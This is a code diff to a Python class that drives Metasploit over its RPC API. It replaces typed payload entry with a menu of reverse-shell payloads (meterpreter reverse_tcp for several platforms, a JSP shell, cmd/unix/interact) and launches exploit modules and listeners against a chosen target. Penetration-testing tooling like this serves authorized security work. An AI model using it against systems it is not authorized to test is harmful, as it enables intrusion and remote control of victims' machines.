@@ -161,12 +161,38 @@ class MetasploitRPCEngine:
         if not custom_mod:
             return
 
-        payload = "windows/x64/meterpreter/reverse_tcp"
+        # Smart default payload guessing based on the module
+        default_payload = "windows/x64/meterpreter/reverse_tcp"
         if "unix" in custom_mod or "linux" in custom_mod or "apache" in custom_mod:
-            payload = "cmd/unix/interact"
+            default_payload = "cmd/unix/interact"
 
-        custom_payload = questionary.text(
-            f"Payload (Default: {payload}):", default=payload, style=Q_STYLE).ask()
+        # Interactive Dropdown Menu for Payloads
+        payload_choices = [
+            "windows/x64/meterpreter/reverse_tcp",
+            "windows/meterpreter/reverse_tcp",
+            "linux/x64/meterpreter/reverse_tcp",
+            "linux/x86/meterpreter/reverse_tcp",
+            "cmd/unix/interact",
+            "php/meterpreter/reverse_tcp",
+            "java/jsp_shell_reverse_tcp",
+            "osx/x64/meterpreter_reverse_tcp",
+            questionary.Separator(),
+            "Custom (Type it manually)"
+        ]
+
+        custom_payload = questionary.select(
+            "Select Payload:",
+            choices=payload_choices,
+            default=default_payload if default_payload in payload_choices else None,
+            style=Q_STYLE
+        ).ask()
+
+        if custom_payload == "Custom (Type it manually)":
+            custom_payload = questionary.text(
+                "Enter exact MSF Payload path:", default=default_payload, style=Q_STYLE).ask()
+
+        if not custom_payload:
+            return
 
         console.print(Panel(
             f"[bold cyan]Deploying Exploit via API...[/bold cyan]\n[white]Target:[/white] {target}:{rport}\n[white]Module:[/white] {custom_mod}", border_style="red"))
@@ -179,7 +205,7 @@ class MetasploitRPCEngine:
             payload_opts = {'LHOST': lhost, 'LPORT': 4444}
             job = exploit.execute(payload=custom_payload, **payload_opts)
 
-            # SAFE TYPE CHECK ADDED HERE
+            # SAFE TYPE CHECK
             if isinstance(job, dict) and job.get('job_id') is not None:
                 console.print(
                     f"[bold green][+] Exploit launched successfully (Job ID: {job['job_id']})[/bold green]")
@@ -265,8 +291,30 @@ class MetasploitRPCEngine:
                     lhost = ctx.get("LHOST") or "0.0.0.0"
                     lport = questionary.text(
                         "LPORT:", default="4444", style=Q_STYLE).ask()
-                    payload = questionary.text(
-                        "Payload:", default="windows/x64/meterpreter/reverse_tcp", style=Q_STYLE).ask()
+
+                    payload_choices = [
+                        "windows/x64/meterpreter/reverse_tcp",
+                        "windows/meterpreter/reverse_tcp",
+                        "linux/x64/meterpreter/reverse_tcp",
+                        "linux/x86/meterpreter/reverse_tcp",
+                        "cmd/unix/interact",
+                        "php/meterpreter/reverse_tcp",
+                        questionary.Separator(),
+                        "Custom (Type it manually)"
+                    ]
+
+                    payload = questionary.select(
+                        "Select Payload for Listener:",
+                        choices=payload_choices,
+                        style=Q_STYLE
+                    ).ask()
+
+                    if payload == "Custom (Type it manually)":
+                        payload = questionary.text(
+                            "Enter exact MSF Payload path:", default="windows/x64/meterpreter/reverse_tcp", style=Q_STYLE).ask()
+
+                    if not payload:
+                        continue
 
                     try:
                         exploit = self.client.modules.use(
@@ -274,7 +322,7 @@ class MetasploitRPCEngine:
                         job = exploit.execute(
                             payload=payload, LHOST=lhost, LPORT=int(lport))
 
-                        # SAFE TYPE CHECK ADDED HERE TOO
+                        # SAFE TYPE CHECK
                         if isinstance(job, dict) and job.get('job_id') is not None:
                             console.print(
                                 f"[bold green][+] Listener started in background (Job ID: {job['job_id']})[/bold green]")
